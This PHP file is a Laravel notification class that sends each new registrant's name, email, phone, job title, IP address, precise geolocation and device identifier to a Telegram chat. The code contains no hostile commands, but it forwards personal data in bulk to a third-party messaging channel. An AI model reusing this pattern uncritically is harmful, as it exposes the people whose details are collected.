<?php

namespace App\Notifications\Landing;

use Illuminate\Bus\Queueable;
use Illuminate\Notifications\Notification;
use NotificationChannels\Telegram\TelegramChannel;
use NotificationChannels\Telegram\Enums\ParseMode;
use NotificationChannels\Telegram\TelegramMessage;

class TelegramNewRegister extends Notification
{
    use Queueable;

    protected string $name;
    protected string $username;
    protected string $email;
    protected string $jobTitle;
    protected string $phone;
    protected mixed $location;
    protected ?string $guestIdentifier;
    protected ?string $deviceIdentifier;
    protected ?string $tele_id;

    public function __construct(
        string $name,
        string $username,
        string $email,
        string $jobTitle,
        string $phone,
        mixed $location,
        ?string $guestIdentifier,
        ?string $deviceIdentifier,
        ?string $tele_id = null
    ) {
        $this->name = $name;
        $this->username = $username;
        $this->email = $email;
        $this->jobTitle = $jobTitle;
        $this->phone = $phone;
        $this->location = $location;
        $this->guestIdentifier = $guestIdentifier;
        $this->deviceIdentifier = $deviceIdentifier;
        $this->tele_id = $tele_id;
    }

    public function via($notifiable): array
    {
        return [TelegramChannel::class];
    }

    public function toTelegram($notifiable): TelegramMessage
    {
        $location = is_object($this->location) ? $this->location : null;
        $registrationId = '#R-' . random_int(10, 99);
        $registration3Id = random_int(100, 999);
        $sections = [];

        $sections[] = [
            '<b>NEW REGISTER MESSAGE</b>',
            '<b>MKR-ID:</b> ' . $this->escapeTelegram($registrationId . '-Register-' . $registration3Id),
            '<b>Name:</b> ' . $this->escapeTelegram($this->name),
            '<b>Username:</b> ' . $this->escapeTelegram($this->username),
            '<b>Email Address:</b> ' . $this->escapeTelegram($this->email),
            '<b>Phone Number:</b> ' . $this->escapeTelegram($this->phone),
            '<b>Job Title:</b> ' . $this->escapeTelegram($this->jobTitle),
        ];

        $this->appendSection($sections, [
            $this->formatLine('IP ADDRESS', $location?->ip ?? $this->guestIdentifier),
        ]);

        $this->appendSection($sections, [
            $this->formatLine('Country', $location?->countryName),
            $this->formatLine('Country Code', $location?->countryCode),
        ]);

        $this->appendSection($sections, [
            $this->formatLine('Region Name', $location?->regionName),
            $this->formatLine('Region Code', $location?->regionCode),
        ]);

        $this->appendSection($sections, [
            $this->formatLine('City Name', $location?->cityName),
        ]);

        $this->appendSection($sections, [
            $this->formatLine('Zip Code', $location?->zipCode),
        ]);

        $this->appendSection($sections, [
            $this->formatLine('Latitude', $location?->latitude),
            $this->formatLine('Longitude', $location?->longitude),
        ]);

        $this->appendSection($sections, [
            $this->formatLine('Area Code', $location?->areaCode),
        ]);

        $this->appendSection($sections, [
            $this->formatLine('Time Zone', $location?->timezone),
        ]);

        $this->appendSection($sections, [
            $this->formatLine('Submitted At', now()->format('Y-m-d H:i:s T')),
        ]);

        $this->appendSection($sections, [
            $this->formatLine('Device', $this->deviceIdentifier),
        ]);

        $content = implode("\n-----------------\n", array_map(
            static fn (array $lines) => implode("\n", $lines),
            $sections
        ));

        $message = TelegramMessage::create()
            ->parseMode(ParseMode::HTML)
            ->content($content);

        if (! empty($this->tele_id)) {
            $message->to($this->tele_id);
        }

        return $message;
    }

    public function toArray($notifiable): array
    {
        return [
            'name' => $this->name,
            'username' => $this->username,
            'email' => $this->email,
            'job_title' => $this->jobTitle,
            'phone' => $this->phone,
        ];
    }

    protected function appendSection(array &$sections, array $lines): void
    {
        $lines = array_values(array_filter($lines, static fn (?string $line) => $line !== null));

        if ($lines !== []) {
            $sections[] = $lines;
        }
    }

    protected function formatLine(string $label, mixed $value): ?string
    {
        $value = trim((string) ($value ?? ''));

        if ($value === '') {
            return null;
        }

        return '<b>' . $this->escapeTelegram($label) . ':</b> ' . $this->escapeTelegram($value);
    }

    protected function escapeTelegram(string $value): string
    {
        return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
}
